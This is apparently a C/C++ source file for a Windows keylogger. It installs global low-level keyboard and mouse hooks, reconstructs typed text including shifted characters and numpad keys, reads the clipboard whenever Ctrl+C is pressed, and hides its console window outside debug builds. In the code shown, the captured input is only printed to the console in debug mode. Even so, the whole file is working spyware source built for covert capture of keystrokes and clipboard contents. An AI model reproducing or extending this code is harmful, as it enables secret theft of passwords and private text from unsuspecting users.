//Win Headers
#include <windows.h>
#include <winuser.h>

//C Headers
#include <stdio.h>

#define DEBUG 1

//Debug Headers
#ifdef DEBUG
    #include <iostream>
#endif

#define LPSTR_SIZE 0xFF
#define MAX_BUFLEN 5120

//Global variables
HHOOK mousehook;
HHOOK keyboardhook;
KBDLLHOOKSTRUCT kbd_struct;
MSLLHOOKSTRUCT mouse_struct;


//Callback functions
LRESULT WINAPI HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT WINAPI HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam);


void StealthConsole();
void SetMouseHook();
void SetKeyboardHook();
void SetHooks();
void ReleaseMouseHook();
void ReleaseKeyboardHook();
void ReleaseHooks();
bool IfPrintable(char* str);
void CheckNumpad(char* str, bool numlock, bool shortcut);
void CheckSpecialChar(char *str);
void GetClipboardContent();


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    MSG msg;

    SetHooks();
    StealthConsole();

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}

LRESULT CALLBACK HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {

        mouse_struct = *((MSLLHOOKSTRUCT*)lParam);

        // std::cout << "x: " << mouse_struct.pt.x << "\ty: " << mouse_struct.pt.y << "\n";

        switch (wParam) {
            case WM_LBUTTONDOWN:
#ifdef DEBUG
            std::cout << "[LMB DOWN]\n";
#endif
            break;

            case WM_LBUTTONUP:
#ifdef DEBUG
            std::cout << "[LMB UP]\n";
#endif
            break;

            case WM_RBUTTONDOWN:
#ifdef DEBUG
            std::cout << "[RMB DOWN]\n";
#endif
            break;

            case WM_RBUTTONUP:
#ifdef DEBUG
            std::cout << "[RMB UP]\n";
#endif
            break;

            case WM_MBUTTONDOWN:
#ifdef DEBUG
            std::cout << "[MMB DOWN]\n";
#endif
            break;

            case WM_MBUTTONUP:
#ifdef DEBUG
            std::cout << "[MMB UP]\n";
#endif
            break;

            case WM_MOUSEWHEEL:
            short rotation = (short)HIWORD(mouse_struct.mouseData);
            if (rotation > 0) {
#ifdef DEBUG
                std::cout << "[FWD ROTATE " << rotation << "]\n";
#endif        
            }
            else {
#ifdef DEBUG
                std::cout << "[BWD ROTATE" << rotation << "]\n";
#endif
            }
        }
    }

    return CallNextHookEx(mousehook, nCode, wParam, lParam);
}

LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        static bool capslock = GetKeyState(VK_CAPITAL);
        static bool shift = false;
        static bool numlock = GetKeyState(VK_NUMLOCK);
        static bool ctrl = GetKeyState(VK_CONTROL);
        static bool clipboard = false;
        bool shortcut = false;
        kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
        char str[LPSTR_SIZE] = {0};
        DWORD msg = 1;
        bool printable;

        //Bits position from docs
        msg += (kbd_struct.scanCode << 16);
        if (kbd_struct.vkCode == 0xA1) {
            msg += ((kbd_struct.flags^LLKHF_EXTENDED) << 24);
        }
        else {
            msg += (kbd_struct.flags << 24);
        }
        GetKeyNameText(msg, str, LPSTR_SIZE);
        // std::cout << "DEBUG:\t" << str << "\tvk:\t" << kbd_struct.vkCode << "\tscan:\t" << kbd_struct.scanCode << "\tflag:\t" << kbd_struct.flags << "\n";   
        // std::cout << "TEST:\t" << (kbd_struct.flags & LLKHF_EXTENDED) << /*"\txor:\t" << (kbd_struct.flags ^ LLKHF_EXTENDED) <<*/ "\n";    

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // std::cout << "\nDEBUG: " << str << "\n Caps: " << capslock << "\n Shift: " << shift << "\n";
            printable = IfPrintable(str);

            if (!printable) {
                if (strcmp(str, "Caps Lock") == 0) {
                    capslock = !capslock;
                }
                else if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                    shift = true;
                }
                else if (strcmp(str, "Num Lock") == 0) {
                    numlock = !numlock;
                }
                else if ((strcmp(str, "Ctrl") == 0) || (strcmp(str, "Right Ctrl") == 0)) {
                    ctrl = true;
                }

                if ((strcmp(str, "Enter") == 0) || (strcmp(str, "Num Enter") == 0)) {
                    strncpy(str, "\n", LPSTR_SIZE);
                    shortcut = true;
                }
                else if (strcmp(str, "Space") == 0) {
                    strncpy(str, " ", LPSTR_SIZE);
                    shortcut = true;
                }
                else if (strcmp(str, "Tab") == 0) {
                    strncpy(str, "\t", LPSTR_SIZE);
                    shortcut = true;
                }
                else {
                    char tmp[LPSTR_SIZE] = {0};
                    snprintf(tmp, LPSTR_SIZE, "[%s]", str);
                    strncpy(str, tmp, LPSTR_SIZE);
                }
            
                CheckNumpad(str, numlock, shortcut);
            }

            else if (printable) {
                int val = int(str[0]);
                if ((val >= 65) && (val <= 90)) {
                    if (shift == capslock) {
                        str[0] = tolower(str[0]);

                        if (val == 67 && ctrl) {
                            clipboard = true;
                        }
                    }
                }
                else {
                    if (shift) {
                        CheckSpecialChar(str);
                    }
                }
            }
#ifdef DEBUG
            std::cout << str;
#endif
        }
        else if(wParam == WM_KEYUP) {
            if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
                shift = false;
            }
            else if ((strcmp(str, "Ctrl") == 0) || (strcmp(str, "Right Ctrl") == 0)) {
                ctrl = false;
            }
            if (clipboard) {
                GetClipboardContent();
                clipboard = false;
            }
        }
    }

    return CallNextHookEx(keyboardhook, nCode, wParam, lParam);
}

void StealthConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    
#ifdef DEBUG
    ShowWindow(stealth, SW_SHOWNORMAL); 
#else
    ShowWindow(stealth, SW_HIDE); 
#endif
}

void SetMouseHook() {
    if (!(mousehook = SetWindowsHookEx(WH_MOUSE_LL, HookMouseCallback, NULL, 0))) {
#ifdef DEBUG
        std::cout << "Failed to install mouse hook!\n";
#endif
    }
}

void SetKeyboardHook() {
    if (!(keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, HookKeyboardCallback, NULL, 0))) {
#ifdef DEBUG
        std::cout << "Failed to install keyboard hook!\n";
#endif
    }
}

void SetHooks() {
    SetMouseHook();
    SetKeyboardHook();
}

void ReleaseMouseHook() {
    UnhookWindowsHookEx(mousehook);
}

void ReleaseKeyboardHook() {
    UnhookWindowsHookEx(keyboardhook);
}

void ReleaseHooks() {
    ReleaseMouseHook();
    ReleaseKeyboardHook();
}

bool IfPrintable(char* str) {
    return ((strlen(str) <= 1) ? true : false);
}

void CheckNumpad(char* str, bool numlock, bool shortcut) {
//Cause there is no known method to me to map it automatically,
//I have to do it manually
//Not using C++ map, bcs of binary size
    if (numlock && !shortcut) {
        if (strcmp(str, "[Num 0]") == 0) {
            strncpy(str, "0", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 1]") == 0) {
            strncpy(str, "1", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 2]") == 0) {
            strncpy(str, "2", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 3]") == 0) {
            strncpy(str, "3", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 4]") == 0) {
            strncpy(str, "4", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 5]") == 0) {
            strncpy(str, "5", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 6]") == 0) {
            strncpy(str, "6", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 7]") == 0) {
            strncpy(str, "7", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 8]") == 0) {
            strncpy(str, "8", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 9]") == 0) {
            strncpy(str, "9", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num Del]") == 0) {
            strncpy(str, "[,]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num +]") == 0) {
            strncpy(str, "+", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num -]") == 0) {
            strncpy(str, "-", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num *]") == 0) {
            strncpy(str, "*", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num /]") == 0) {
            strncpy(str, "/", LPSTR_SIZE);
        }
    }
    else if (!shortcut) {
        if (strcmp(str, "[Num 0]") == 0) {
            strncpy(str, "[Insert]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 1]") == 0) {
            strncpy(str, "[End]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 2]") == 0) {
            strncpy(str, "[Down]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 3]") == 0) {
            strncpy(str, "[Page Down]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 4]") == 0) {
            strncpy(str, "[Left]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 5]") == 0) {
            strncpy(str, "[]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 6]") == 0) {
            strncpy(str, "[Right]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 7]") == 0) {
            strncpy(str, "[Home]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 8]") == 0) {
            strncpy(str, "[Up]", LPSTR_SIZE);
        }
        else if (strcmp(str, "[Num 9]") == 0) {
            strncpy(str, "[Page Up]", LPSTR_SIZE);
        }
    }
}

void CheckSpecialChar(char* str) {
//Same situation - function now available, map too big
    if (str[0] == '1') {
        str[0] = '!';
    }
    else if (str[0] == '2') {
        str[0] = '@';
    }
    else if (str[0] == '3') {
        str[0] = '#';
    }
    else if (str[0] == '4') {
        str[0] = '$';
    }
    else if (str[0] == '5') {
        str[0] = '%';
    }
    else if (str[0] == '6') {
        str[0] = '^';
    }
    else if (str[0] == '7') {
        str[0] = '&';
    }
    else if (str[0] == '8') {
        str[0] = '*';
    }
    else if (str[0] == '9') {
        str[0] = '(';
    }
    else if (str[0] == '0') {
        str[0] = ')';
    }
    else if (str[0] == '-') {
        str[0] = '_';
    }
    else if (str[0] == '=') {
        str[0] = '+';
    }
    else if (str[0] == '[') {
        str[0] = '{';
    }
    else if (str[0] == ']') {
        str[0] = '}';
    }
    else if (str[0] == '\\') {
        str[0] = '|';
    }
    else if (str[0] == ';') {
        str[0] = ':';
    }
    else if (str[0] == '\'') {
        str[0] = '"';
    }
    else if (str[0] == ',') {
        str[0] = '<';
    }
    else if (str[0] == '.') {
        str[0] = '>';
    }
    else if (str[0] == '/') {
        str[0] = '?';
    }
}

void GetClipboardContent() {
    HANDLE clip;
    LPSTR pText;
    char text[MAX_BUFLEN];

    if (OpenClipboard(NULL)) {
        clip = GetClipboardData(CF_TEXT);
        if (clip == NULL) {
            CloseClipboard();
            return;
        }
        
        pText = (LPSTR)GlobalLock(clip);
        if (pText == NULL) {
            GlobalUnlock(clip);
            CloseClipboard();
            return;
        }

        strncpy(text, pText, MAX_BUFLEN);
        GlobalUnlock(clip);
        CloseClipboard();
    }
    else {
#ifdef DEBUG
        std::cout << "Failed to get clipboard content!\n";
#endif
        return;
    }
    char result[MAX_BUFLEN] = {0};
    snprintf(result, MAX_BUFLEN, "[CB:%s]", text);
#ifdef DEBUG
    std::cout << result << "\n";
#endif
}